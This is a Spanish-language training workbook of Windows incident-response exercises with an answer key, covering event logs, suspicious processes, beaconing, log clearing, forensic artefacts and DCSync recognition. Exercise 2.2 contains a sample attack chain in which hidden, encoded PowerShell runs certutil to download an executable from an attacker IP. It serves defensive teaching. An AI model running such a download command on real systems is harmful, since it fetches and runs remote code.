# Cuaderno de ejercicios — Auditoría de seguridad en un servidor Windows

**Documento:** Cuaderno-Ejercicios-Seguridad-Windows.md
**Versión:** 1.1
**Estado:** Aprobado (mesa evaluadora, ciclo 4)
**Fecha:** 2026-09-17
**Compañero de:** `Beginning-Security-Windows-Network-Guide.md`
**Audiencia:** quien ya leyó (o está leyendo) la guía base y quiere formar criterio practicando.

---

## Cómo usar este cuaderno

Cada ejercicio presenta una **salida de comando o un fragmento de log** y una o más preguntas. Primero **respóndalas usted**, por escrito, antes de mirar la solución. Las respuestas están todas juntas al final (§Respuestas), no debajo de cada ejercicio, justamente para que no las lea de reojo.

- Los ejercicios se apoyan en el **escenario testigo** de la guía (servidor `SRV-FILE01` de `CONTOSO`, ver Anexo D de la guía) y en **micro-casos nuevos** que se declaran cuando aparecen.
- Todo dato es **sintético y coherente**; las salidas reproducen el formato real de Windows con valores del caso.
- Dificultad creciente: 🟢 básico, 🟡 intermedio, 🔴 integrador.
- Se puede resolver **solo leyendo** (con la salida que trae cada ejercicio); el laboratorio es opcional pero recomendado.
- Muchos ejercicios se pueden **reproducir en el laboratorio** (§10 de la guía) para ver la salida real y fijar el criterio.
- En los ejercicios 🔴 abiertos, la respuesta del final es una **respuesta modelo**: si usted redactó distinto pero llegó a las mismas conclusiones y las fundamentó, está bien. No se evalúa la redacción, se evalúa el criterio.

**Índice de módulos**

1. [Registro de eventos](#módulo-1--registro-de-eventos)
2. [Sistema vivo: procesos, servicios, sesiones](#módulo-2--sistema-vivo)
3. [Red y conexiones](#módulo-3--red-y-conexiones)
4. [Artefactos y borrado de logs](#módulo-4--artefactos-y-borrado-de-logs)
5. [Intencionalidad del borrado](#módulo-5--intencionalidad-del-borrado)
6. [Identidad y Active Directory](#módulo-6--identidad-y-active-directory)
7. [Caso integrador](#módulo-7--caso-integrador)
- [Respuestas explicativas](#respuestas-explicativas)

---

# Módulo 1 — Registro de eventos

### Ejercicio 1.1 🟢
Observa este fragmento del registro de seguridad (consultado en el colector):

```
TimeCreated           Id    Cuenta     Tipo   Dirección de origen
15/09/2026 03:11:41   4625  soporte    10     203.0.113.14
15/09/2026 03:11:57   4625  soporte    10     203.0.113.14
15/09/2026 03:12:20   4625  soporte    10     203.0.113.14
15/09/2026 03:14:22   4624  soporte    10     203.0.113.14
```

**Preguntas:** (a) ¿Qué está ocurriendo en las tres primeras líneas? (b) ¿Qué significa la cuarta y por qué es más grave que las anteriores? (c) ¿Qué tipo de inicio de sesión es el 10?

### Ejercicio 1.2 🟡
Dos fragmentos de 4625 de dos incidentes distintos:

```
Caso A:  Cuenta: administrador   Subestado: 0xC000006A   (x60 en 5 min)
Caso B:  Cuenta: jdoe, mgarcia, root, admin, test ...    Subestado: 0xC0000064   (x300, nombres distintos)
```

**Pregunta:** ¿Cuál es fuerza bruta sobre una cuenta y cuál es *password spraying*? Justifique con el subestado.

### Ejercicio 1.3 🟡
En el registro de seguridad de `SRV-FILE01` (local) usted encuentra **un solo evento**: un 1102 con fecha 15/09 03:40:11, sujeto `svc_update`. No hay 4624, ni 4720, ni nada anterior.

**Preguntas:** (a) ¿Por qué el log tiene un único evento? (b) ¿Dónde puede recuperar los eventos que faltan? (c) ¿El hecho de que falten prueba que no hubo actividad antes?

---

# Módulo 2 — Sistema vivo

### Ejercicio 2.1 🟢
Salida de `Get-Process` (extracto):

```
Id    ProcessName   Path
612   lsass         C:\Windows\System32\lsass.exe
7104  svchost       C:\Windows\System32\svchost.exe
9310  update        C:\Users\Public\update.exe
1180  lsass         C:\Users\Public\lsass.exe
```

**Pregunta:** dos de estas líneas son sospechosas. ¿Cuáles y por qué? (Hay dos motivos distintos.)

### Ejercicio 2.2 🟡
Árbol de procesos (micro-caso nuevo: estación de trabajo `PC-VENTAS07`):

```
ParentProcessId  ProcessId  Name             CommandLine
6620 (OUTLOOK)   7010       winword.exe      "Factura_09.docx"
7010 (WINWORD)   7188       powershell.exe   -w hidden -enc JABzAD0A...
7188 (POWERSHELL) 7205      certutil.exe     -urlcache -split -f http://203.0.113.14/a.exe
```

**Preguntas:** (a) Reconstruya la historia: ¿qué pasó, en orden? (b) ¿Qué dos banderas de `powershell.exe` son señales de alarma? (c) ¿Qué está haciendo `certutil` y por qué es un abuso?

### Ejercicio 2.3 🟡
Servicio hallado en `SRV-FILE01`:

```
Name          State    StartMode  PathName
WinDefendUpd  Running  Auto       C:\Users\Public\update.exe
```

**Pregunta:** enumere tres indicios de que este servicio es malicioso y diga con qué evento del registro confirmaría cuándo se instaló.

---

# Módulo 3 — Red y conexiones

### Ejercicio 3.1 🟢
Salida de conexiones externas en `SRV-FILE01`:

```
Destino               PID    Proceso   Ruta
20.190.160.14:443     7104   svchost   C:\Windows\System32\svchost.exe
203.0.113.14:443      9310   update    C:\Users\Public\update.exe
```

**Preguntas:** (a) ¿Cuál conexión investigaría primero y por qué? (b) ¿Cómo enlaza esta salida con la del ejercicio 2.3?

### Ejercicio 3.2 🔴
Un administrador afirma: "Revisé las conexiones con `netstat` tres veces hoy y nunca vi nada raro, así que el servidor está limpio."

**Pregunta:** explique por qué ese razonamiento es insuficiente y qué haría usted para cubrir el hueco.

### Ejercicio 3.3 🟡
En el firewall aparece que `SRV-FILE01` se conecta a `203.0.113.14:443` **exactamente cada 60 segundos**, enviando siempre unos 2 KB, las 24 horas.

**Pregunta:** ¿qué nombre recibe ese patrón y por qué es sospechoso, si el tráfico va cifrado por 443 (HTTPS) como el de cualquier web?

---

# Módulo 4 — Artefactos y borrado de logs

### Ejercicio 4.1 🟡
El atacante borró los logs **y** borró `C:\Users\Public\update.exe` del disco. Un compañero concluye: "Ya no hay forma de probar que ese programa corrió."

**Pregunta:** ¿es correcto? Nombre al menos tres artefactos que podrían probar la ejecución pese al doble borrado, y qué aporta cada uno.

### Ejercicio 4.2 🟢
Ordene estas cuatro evidencias de **más** a **menos** volátil (cuál recolectaría primero): (1) un archivo `.evtx` en disco, (2) la memoria RAM, (3) un backup en otra ciudad, (4) las conexiones de red activas.

### Ejercicio 4.3 🔴
Usted llega al servidor sospechoso. Su jefe dice: "Reinícialo para cortar el ataque." 

**Pregunta:** ¿qué le respondería y qué haría en su lugar? Justifique con el orden de volatilidad.

---

# Módulo 5 — Intencionalidad del borrado

### Ejercicio 5.1 🟡
El registro de seguridad de `SRV-CONTA02` (micro-caso nuevo) tiene su evento más antiguo fechado hace apenas 6 horas, pero el `RecordId` del primer evento es **481.203** y la numeración sube de forma continua. **No** hay ningún 1102.

**Pregunta:** ¿esto es un borrado malicioso? Justifique.

### Ejercicio 5.2 🔴
Compare dos hallazgos:

```
Caso A:  Security con un 1102 a las 03:40, sujeto svc_update (cuenta creada esa madrugada),
         precedido de un 1100 a las 03:39. Nadie del equipo registró la acción.
Caso B:  Security vaciado con un 1102 a las 02:00 de un domingo, sujeto flopez (admin conocida),
         que figura en el calendario de mantenimiento con el ticket #4471 "rotación de logs".
```

**Pregunta:** ambos tienen un 1102. ¿Cuál es intencional-malicioso y cuál es legítimo? ¿Qué señales lo deciden?

### Ejercicio 5.3 🟡
Verdadero o falso, y por qué: "Si un registro de eventos aparece vacío pero **no** tiene ningún evento 1102, entonces seguro que nadie lo borró; se vació solo."

---

# Módulo 6 — Identidad y Active Directory

### Ejercicio 6.1 🟢
Miembros del grupo Administradores de `SRV-FILE01`:

```
SRV-FILE01\Administrador
CONTOSO\Administradores del dominio
SRV-FILE01\svc_update
```

**Pregunta:** ¿cuál entrada investigaría y qué evento buscaría para saber quién la agregó y cuándo?

### Ejercicio 6.2 🔴 (de reconocimiento y escalamiento)
*Objetivo: no se espera que usted resuelva este ataque, sino que lo reconozca y sepa que debe escalarlo.*

En el controlador de dominio aparece un evento **4662** con permisos de replicación (`DS-Replication-Get-Changes`) originado desde `10.0.20.55`, que es la IP de una estación de trabajo de ventas, no de un controlador de dominio.

**Preguntas:** (a) ¿Qué ataque sugiere? (b) ¿Por qué es gravísimo? (c) ¿Debería usted resolverlo solo?

---

# Módulo 7 — Caso integrador

### Ejercicio 7.1 🔴
Reúna las piezas del escenario testigo. Con estos hallazgos:

- Log local de `SRV-FILE01` casi vacío, arranca con un 1102 (03:40, `svc_update`).
- `svc_update` es admin local; nadie la creó a propósito.
- En el colector: 4624 tipo 10 de `soporte` desde `203.0.113.14` (03:14), 4720/4732 de `svc_update` (03:16).
- `update.exe` (PID 9310) corriendo desde `C:\Users\Public`, conectado a `203.0.113.14:443`, también como servicio y tarea.
- Prefetch de `UPDATE.EXE` fechado 03:20; SRUM: ~2,3 GB salientes por `update.exe`.

**Preguntas:** (a) Escriba la línea de tiempo del ataque, en orden. (b) ¿Cuál fue el punto de entrada y qué vicio lo permitió? (c) ¿Hubo exfiltración? ¿Con qué evidencia? (d) ¿Cuál sería su **primer** paso de respuesta y cuál **no** debe hacer todavía?

### Ejercicio 7.2 🔴
A partir del caso 7.1, proponga **tres medidas de endurecimiento** que habrían impedido o detectado antes este ataque, y diga qué parte de la cadena corta cada una.

---
---

# Respuestas explicativas

> Las respuestas no solo dicen "qué"; explican el **porqué**, para que el criterio quede formado y pueda aplicarlo a un caso distinto. Entre paréntesis, la sección de la guía donde profundizar.

## Módulo 1

**1.1** (a) Tres **intentos fallidos** de inicio de sesión (evento 4625) contra la cuenta `soporte`, todos por RDP y desde la misma IP externa: es un ataque de adivinación de contraseña en curso. (b) La cuarta línea es un 4624 = **inicio de sesión exitoso**, misma cuenta, misma IP, tres minutos después: el atacante **acertó** la contraseña y entró. Es más grave porque ya no es un intento, es un acceso conseguido. (c) El tipo 10 es **escritorio remoto (RDP)**. La secuencia "muchos fallos → un éxito desde la misma IP externa" es la firma de una contraseña finalmente adivinada. (Guía §5.4, §5.4.1)

**1.2** El **Caso A** es fuerza bruta sobre **una** cuenta: el subestado `0xC000006A` significa "la cuenta existe pero la contraseña es incorrecta", y todos los intentos van contra `administrador`; el atacante sabe que existe y le prueba claves. El **Caso B** es *password spraying*: el subestado `0xC0000064` significa "el usuario no existe", y los nombres cambian; el atacante prueba nombres al azar (o una contraseña común contra muchos usuarios). Leer el subestado es lo que distingue los dos ataques, que se defienden distinto. (Guía §5.4)

**1.3** (a) Porque hubo un **borrado total** del registro a las 03:40: el 1102 es el primer evento del log nuevo, y todo lo anterior se eliminó. (b) En el **colector WEF** (`SRV-LOG01`), que recibió los eventos cuando ocurrieron, antes del borrado. (c) **No**: la ausencia de eventos no prueba ausencia de actividad; aquí prueba lo contrario (alguien se tomó el trabajo de borrarlos). La ausencia nunca descarta; solo la presencia confirma. (Guía §5.5, §5.6, §7.6)

## Módulo 2

**2.1** Línea 3 (`update` en `C:\Users\Public`): un proceso legítimo del sistema **no** corre desde una carpeta de usuario; ruta anómala. Línea 4 (`lsass` en `C:\Users\Public`): usa el **nombre de un proceso legítimo de Windows** (`lsass.exe`), pero desde la ruta equivocada — el `lsass` real vive solo en `C:\Windows\System32`. Son dos motivos distintos: uno es un nombre cualquiera en lugar raro; el otro es un **impostor** que roba un nombre de sistema. (Guía §6.1, §6.2)

**2.2** (a) Llegó un correo (Outlook) con un adjunto Word (`Factura_09.docx`); al abrirlo, Word lanzó PowerShell, y PowerShell lanzó `certutil` para descargar un ejecutable. Es la cadena clásica de un documento malicioso. (b) `-w hidden` (ventana oculta) y `-enc` (comando codificado en Base64 para que no se lea): dos señales de ocultamiento. (c) `certutil` es una herramienta legítima de certificados, pero aquí se usa con `-urlcache -split -f` para **descargar** un archivo desde Internet: es "vivir de la tierra" (usar una herramienta del sistema para fines maliciosos y evadir el antivirus). El proceso padre imposible (Word → PowerShell) es lo que delata todo. (Guía §3.4, §6.3)

**2.3** Tres indicios: (1) el ejecutable está en `C:\Users\Public`, donde un servicio real nunca vive; (2) el nombre `WinDefendUpd` imita al antivirus para pasar desapercibido; (3) arranca en modo automático (`Auto`), garantizando persistencia tras reinicios. Se confirma **cuándo y por quién** se instaló con el evento **7045** (registro System), que además puede haber sobrevivido si el atacante borró solo el Security. (Guía §6.4, §5.4)

## Módulo 3

**3.1** (a) La segunda: `update.exe` desde `C:\Users\Public` conectado a `203.0.113.14:443`. Reúne tres indicios (ruta anómala, nombre genérico, IP externa desconocida), mientras que `svchost` desde System32 hacia un rango de Microsoft es plausiblemente legítimo. (b) Es el **mismo PID (9310)** del servicio malicioso del 2.3: el proceso que persiste como servicio es el que está hablando con el exterior. El PID enlaza las dos vistas. (Guía §6.1, §7.2, §7.3)

**3.2** El razonamiento falla por el **problema del muestreo**: `netstat` es una foto instantánea. Un canal de control que se activa unos segundos cada hora casi nunca cae dentro de esas tres fotos. La ausencia en fotos puntuales no descarta actividad intermitente. Para cubrirlo se necesita registro **continuo**: Sysmon (Event ID 3 registra toda conexión con su proceso), y/o los logs del firewall analizados a lo largo del tiempo. La foto sirve para *encontrar* algo activo, no para *descartar* algo intermitente. (Guía §7.1, §7.5, §7.6)

**3.3** Es **beaconing** ("llamar a casa"): comunicación a intervalos regulares y de tamaño constante entre el implante y su servidor de control. Es sospechoso pese a ir por 443 porque lo que delata no es el contenido (cifrado, ilegible) sino el **patrón temporal**: una persona navegando genera tráfico irregular; una máquina que reporta cada 60 segundos exactos, no. Herramientas como RITA buscan justamente esa regularidad. (Guía §7.5)

## Módulo 4

**4.1** Es **incorrecto**. Al menos tres artefactos prueban la ejecución pese al doble borrado: (1) **Prefetch** — Windows creó un `.pf` al ejecutar el programa, que sobrevive al borrado del `.exe` y del log, y dice cuándo corrió; (2) **Amcache/ShimCache** — guardan la huella (incluso el hash) de ejecutables que existieron; (3) **SRUM** — registra cuántos datos envió ese programa, por día, útil para probar exfiltración; (4, extra) **MFT/USN Journal** — recuerdan que el archivo existió y fue borrado. Ninguno es un "log de auditoría", por eso el atacante rara vez los toca. (Guía §8)

**4.2** De más a menos volátil: **(2) memoria RAM → (4) conexiones de red activas → (1) archivo .evtx en disco → (3) backup remoto**. La RAM desaparece al apagar; las conexiones cambian en segundos; el `.evtx` persiste pero puede rotar o ser borrado; el backup remoto es lo más estable. Se recolecta en ese orden. (Guía §4.2)

**4.3** Le respondería que reiniciar es probablemente el peor primer paso: **destruye la memoria RAM** (§4.2), que es la evidencia más valiosa y la única irrecuperable — ahí pueden estar las credenciales robadas y el programa del atacante si solo vive en memoria —, y además puede disparar mecanismos de daño y alertar al atacante. En su lugar: preservar primero (capturar memoria, triage, copias externas), entender el alcance, y **después** contener de forma coordinada (§12.2). La única excepción es un daño irreversible en curso (cifrado masivo): ahí sí se aísla de la red de inmediato — aislar de la red no es lo mismo que reiniciar. (Guía §4.1, §4.2, §4.6)

## Módulo 5

**5.1** **No es un borrado malicioso**: es **rotación normal por tamaño/retención**. La clave está en el `RecordId` **alto y continuo** (481.203, subiendo de a uno): eso prueba que el log **no** se vació (un vaciado reinicia la numeración cerca de 1). El log tiene eventos "recientes" simplemente porque, al llenarse, Windows sobrescribió los más viejos — y eso **no** genera 1102. Que sea corto no basta; hay que descartar la causa legítima primero. (Guía §5.5.1, §5.5.3)

**5.2** El **Caso A es malicioso**; el **Caso B es legítimo**. Ambos tienen un 1102 (o sea, ambos son un vaciado deliberado — el 1102 no aparece solo), pero el contexto decide: en A lo hizo una cuenta creada esa misma madrugada (`svc_update`), a las 03:40, precedido de un 1100 (servicio de eventos detenido) y **sin registro** de la acción — todas señales de encubrimiento. En B lo hizo una **administradora conocida**, en horario de mantenimiento de domingo, **con ticket** que lo documenta. Misma acción técnica, intención opuesta. Intencionalidad maliciosa = vaciado deliberado **+** contexto hostil. (Guía §5.5.3)

**5.3** **Falso.** Un log vacío sin 1102 puede deberse a rotación legítima (§5.1), pero **también** puede ser un **borrado parcial** malicioso (el atacante eliminó eventos individuales para no dejar el 1102), que se delata por un **salto** en el `RecordId`; o pudieron apagar la auditoría (4719/1100) antes de actuar. La ausencia de 1102 no prueba inocencia: hay que mirar la numeración y el contexto. La afirmación confunde "no hay marca de vaciado total" con "nadie tocó nada". (Guía §5.5.1, §5.5.2, §5.5.3)

## Módulo 6

**6.1** Investigaría `SRV-FILE01\svc_update`: las otras dos entradas son esperables (el administrador local y el grupo de administradores del dominio), pero `svc_update` es una cuenta **local** que nadie reconoce. Para saber **quién la agregó y cuándo**, busque el evento **4732** ("se agregó un miembro a un grupo local con seguridad habilitada") en el registro de seguridad — en el colector, si el local fue borrado. (Guía §9.2, §5.4)

**6.2** (a) Sugiere un ataque **DCSync**: alguien le pidió al controlador de dominio que le entregue credenciales replicando el directorio, haciéndose pasar por otro DC. (b) Es gravísimo porque los permisos de replicación permiten **extraer las contraseñas (hashes) de todo el dominio**, incluida la de administrador y la cuenta `krbtgt`; con eso el atacante puede fabricarse credenciales válidas de forma persistente (Golden Ticket). Y el origen es una **estación de ventas**, que jamás debería replicar el directorio. (c) **No**: esto excede una guía introductoria; hay que documentar, preservar y **escalar a un especialista** de inmediato, porque la remediación (rotar `krbtgt` dos veces, revisar todo el dominio) es delicada. (Guía §9.4, §12.3)

## Módulo 7

**7.1** (a) Línea de tiempo: **03:02–03:13** fuerza bruta contra `soporte` (4625); **03:14** acceso RDP exitoso desde `203.0.113.14` (4624 tipo 10); **03:16** creación de `svc_update` y alta como admin (4720/4732); **03:20** ejecución de `update.exe` (Prefetch); **03:22–03:23** persistencia como servicio y tarea; **desde ~03:35** C2 y exfiltración a `203.0.113.14:443`; **03:40** borrado del registro de seguridad. (b) El punto de entrada fue el **RDP expuesto a Internet**, y el vicio que lo permitió fue la cuenta `soporte` con **contraseña débil y administrador local** (más la ausencia de MFA). (c) **Sí hubo exfiltración**: el SRUM muestra ~2,3 GB salientes atribuidos a `update.exe`, un programa que no debería enviar nada. (d) Primer paso: **preservar** (capturar memoria si el equipo sigue vivo, triage, exportar logs a un medio externo, tomar la copia del colector). Lo que **no** debe hacer todavía: reiniciar, cambiar contraseñas o bloquear al atacante de a poco — eso destruye evidencia y lo alerta; la contención se hace después y coordinada. (Guía §4, §5, §8, §12.2)

**7.2** Tres medidas y qué parte de la cadena cortan: (1) **Quitar el RDP de Internet y exigir MFA/VPN** → corta el **acceso inicial** (sin puerta expuesta, la fuerza bruta no llega). (2) **Reenvío de eventos a un colector (WEF) fuera del alcance de los admins locales** → neutraliza el **borrado de logs** (aunque borren el local, la copia queda) y habría dado alerta temprana. (3) **Sysmon + Script Block Logging + menor privilegio para `soporte`** → detecta la **ejecución y persistencia** (proceso en carpeta rara, servicio nuevo, PowerShell oculto) y le quita a `soporte` el admin local que permitió crear la puerta trasera. Complementos válidos: bloqueo de cuentas tras N fallos (contra la fuerza bruta), y egreso de red controlado (contra el C2/exfiltración). (Guía §12.4)

---

# Cómo autoevaluarte

Cuente un ejercicio como resuelto solo si llegó a la conclusión **y** pudo explicar el porqué (no si adivinó la opción). Los 🔴 valen doble por integradores.

| Nivel | Señal | Qué le conviene hacer |
|---|---|---|
| **Inicial** | Resuelve los 🟢 pero duda en los 🟡 | Relea §2–§7 de la guía y rehaga el módulo donde falló |
| **En formación** | Resuelve 🟢 y 🟡, se traba en los 🔴 | Practique en el laboratorio (§10) reproduciendo los casos; enfoque §4 (método) y §12 (respuesta) |
| **Sólido** | Resuelve también los 🔴 y justifica cada uno | Ya reconoce y preserva bien; su rol es detectar temprano y escalar (§12.3). Avance a Sysmon/WEF y a los casos de AD |

**Autodiagnóstico por módulo.** Si falló varios ejercicios de un mismo módulo, ahí tiene su punto débil:

- Módulo 1 → §5 (registro de eventos)
- Módulo 2 → §6 (sistema vivo)
- Módulo 3 → §7 (red)
- Módulo 4 → §4 y §8 (método y artefactos)
- Módulo 5 → §5.5 (detección e intencionalidad del borrado)
- Módulo 6 → §9 (identidad y AD)
- Módulo 7 → integra todo; si falla aquí pero aprueba el resto, trabaje el **cruce** de indicios (§12.1)

---

*Fin del cuaderno. Practique en el laboratorio (§10 de la guía): reproducir cada caso y ver la salida real fija el criterio mejor que leerlo.*
